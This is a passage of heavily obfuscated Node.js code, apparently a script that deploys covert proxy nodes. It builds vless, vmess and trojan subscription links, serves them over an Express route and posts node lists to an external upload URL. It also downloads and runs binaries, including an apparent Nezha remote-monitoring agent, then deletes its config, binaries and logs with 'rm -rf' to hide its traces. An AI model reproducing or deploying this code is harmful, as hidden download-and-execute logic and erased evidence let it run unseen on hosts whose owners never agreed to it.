_0x14298c=_0x5a75,_0x7925da={'v':'2','ps':''+_0xd25c2d,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x14298c(0x279),'net':'ws','type':_0x14298c(0x279),'host':_0x24c39f,'path':_0x14298c(0x284),'tls':_0x14298c(0x24a),'sni':_0x24c39f,'alpn':'','fp':_0x14298c(0x1e2)},_0x1ed7c7=_0x14298c(_0x1cf63d._0x15106d)+UUID+'@'+CFIP+':'+CFPORT+_0x14298c(0x1f8)+_0x24c39f+_0x14298c(_0x1cf63d._0x59be62)+_0x24c39f+_0x14298c(0x255)+_0xd25c2d+'\x0a\x0avmess://'+Buffer['from'](JSON[_0x14298c(0x21c)](_0x7925da))[_0x14298c(_0x1cf63d._0x4c6826)]('base64')+_0x14298c(0x233)+UUID+'@'+CFIP+':'+CFPORT+_0x14298c(_0x1cf63d._0xa16c84)+_0x24c39f+'&fp=firefox&type=ws&host='+_0x24c39f+_0x14298c(_0x1cf63d._0x3b7b1d)+_0xd25c2d+_0x14298c(_0x1cf63d._0x2ebc70);console[_0x14298c(_0x1cf63d._0x4541ff)](Buffer[_0x14298c(0x249)](_0x1ed7c7)[_0x14298c(0x219)](_0x14298c(0x1e9))),fs[_0x14298c(0x288)](subPath,Buffer['from'](_0x1ed7c7)['toString'](_0x14298c(0x1e9))),console[_0x14298c(_0x1cf63d._0x4541ff)](FILE_PATH+_0x14298c(_0x1cf63d._0x2408f8)),uploadNodes(),app[_0x14298c(_0x1cf63d._0x2d5d20)]('/'+SUB_PATH,(_0x5f7944,_0x3a16b4)=>{const _0x514921=_0x14298c,_0x395168=Buffer[_0x514921(_0x1acb49._0x2e3b02)](_0x1ed7c7)['toString'](_0x514921(0x1e9));_0x3a16b4[_0x514921(_0x1acb49._0x4ea0a2)](_0x514921(0x268),'text/plain;\x20charset=utf-8'),_0x3a16b4['send'](_0x395168);}),_0x3f1bf6(_0x1ed7c7);},0x7d0);});}}async function uploadNodes(){const _0x191b63={_0x36b38e:0x280,_0x585678:0x203,_0x388f19:0x1ed,_0x2c0494:0x205,_0x40545c:0x25d,_0x44f4b2:0x207},_0x183e74=_0x16b64f;if(UPLOAD_URL&&PROJECT_URL){const _0x48e21a=PROJECT_URL+'/'+SUB_PATH,_0x8b9422={'subscription':[_0x48e21a]};try{const _0x38afae=await axios[_0x183e74(0x207)](UPLOAD_URL+_0x183e74(_0x191b63._0x36b38e),_0x8b9422,{'headers':{'Content-Type':_0x183e74(_0x191b63._0x585678)}});return _0x38afae&&_0x38afae['status']===0xc8?(console[_0x183e74(0x1bb)](_0x183e74(0x212)),_0x38afae):null;}catch(_0x33072d){if(_0x33072d[_0x183e74(_0x191b63._0x388f19)]){if(_0x33072d[_0x183e74(0x1ed)][_0x183e74(0x241)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x183e74(_0x191b63._0x2c0494)](listPath))return;const _0x1b271b=fs['readFileSync'](listPath,'utf-8'),_0x42a914=_0x1b271b[_0x183e74(0x1d4)]('\x0a')[_0x183e74(_0x191b63._0x40545c)](_0x555c31=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x183e74(0x20f)](_0x555c31));if(_0x42a914[_0x183e74(0x22c)]===0x0)return;const _0x5a4dbe=JSON['stringify']({'nodes':_0x42a914});try{const _0x504a89=await axios[_0x183e74(_0x191b63._0x44f4b2)](UPLOAD_URL+_0x183e74(0x23a),_0x5a4dbe,{'headers':{'Content-Type':_0x183e74(_0x191b63._0x585678)}});return _0x504a89&&_0x504a89['status']===0xc8?(console['log'](_0x183e74(0x209)),_0x504a89):null;}catch(_0x40057e){return null;}}else return;}}function _0x5a75(_0x3fcc72,_0x42fcd0){const _0x168f55=_0x168f();return _0x5a75=function(_0x5a7515,_0x93b58){_0x5a7515=_0x5a7515-0x1bb;let _0x6b5e6d=_0x168f55[_0x5a7515];return _0x6b5e6d;},_0x5a75(_0x3fcc72,_0x42fcd0);}function cleanFiles(){const _0x286092={_0x9c1163:0x26c,_0xa3fbf7:0x1de,_0x235630:0x1be,_0x2c9a13:0x204},_0x39e2dd={_0x4c6d46:0x1bb};setTimeout(()=>{const _0x25401b={_0xefcd21:0x26e},_0x2358c3=_0x5a75,_0x5a632b=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x5a632b[_0x2358c3(0x1ce)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x5a632b[_0x2358c3(0x1ce)](phpPath);process[_0x2358c3(_0x286092._0x9c1163)]===_0x2358c3(_0x286092._0xa3fbf7)?exec(_0x2358c3(0x1d1)+_0x5a632b[_0x2358c3(0x1be)]('\x20')+'\x20>\x20nul\x202>&1',_0x7b030=>{const _0x239bf7=_0x2358c3;console[_0x239bf7(_0x25401b._0xefcd21)](),console['log']('App\x20is\x20running'),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0x5a632b[_0x2358c3(_0x286092._0x235630)]('\x20')+_0x2358c3(_0x286092._0x2c9a13),_0x117d4a=>{const _0x35c94c=_0x2358c3;console[_0x35c94c(0x26e)](),console[_0x35c94c(_0x39e2dd._0x4c6d46)]('App\x20is\x20running'),console[_0x35c94c(0x1bb)](_0x35c94c(0x1e8));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3f5e28={_0x435f63:0x1bb,_0x3efc9e:0x203,_0x5dc582:0x1d8,_0x39bb13:0x26d,_0x4eb82b:0x202},_0x35e07c=_0x16b64f;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x35e07c(_0x3f5e28._0x435f63)](_0x35e07c(0x1bf));return;}try{const _0x52567c=await axios[_0x35e07c(0x207)](_0x35e07c(0x257),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x35e07c(_0x3f5e28._0x3efc9e)}});return console[_0x35e07c(0x1bb)](_0x35e07c(_0x3f5e28._0x5dc582)),_0x52567c;}catch(_0x5d0f88){return console[_0x35e07c(_0x3f5e28._0x39bb13)](_0x35e07c(_0x3f5e28._0x4eb82b)+_0x5d0f88[_0x35e07c(0x1f3)]),null;}}async function startserver(){const _0x476dfc={_0x1e6f59:0x26d},_0x595fc1=_0x16b64f;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2b147d){console[_0x595fc1(_0x476dfc._0x1e6f59)](_0x595fc1(0x24e),_0x2b147d);}}startserver()[_0x16b64f(0x1fc)](_0x2a5591=>{const _0x3387a1={_0x24b97a:0x26d},_0x23ba41=_0x16b64f;console[_0x23ba41(_0x3387a1._0x24b97a)](_0x23ba41(0x274),_0x2a5591);}),app[_0x16b64f(0x289)]('/',async function(_0x532ba2,_0x446f19){const _0x395547={_0x32013c:0x1be,_0x9f63e1:0x1e6,_0x182802:0x23d,_0x53611e:0x1d5,_0x186f5e:0x21e},_0x5e966c=_0x16b64f;try{const _0x37ddc6=path[_0x5e966c(_0x395547._0x32013c)](__dirname,_0x5e966c(_0x395547._0x9f63e1)),_0x4f5209=await fs[_0x5e966c(_0x395547._0x182802)][_0x5e966c(_0x395547._0x53611e)](_0x37ddc6,_0x5e966c(0x270));_0x446f19[_0x5e966c(_0x395547._0x186f5e)](_0x4f5209);}catch(_0x545d11){_0x446f19['send'](_0x5e966c(0x1f6));}}),app[_0x16b64f(0x240)](PORT,()=>console[_0x16b64f(0x1bb)](_0x16b64f(0x266)+PORT+'!'));
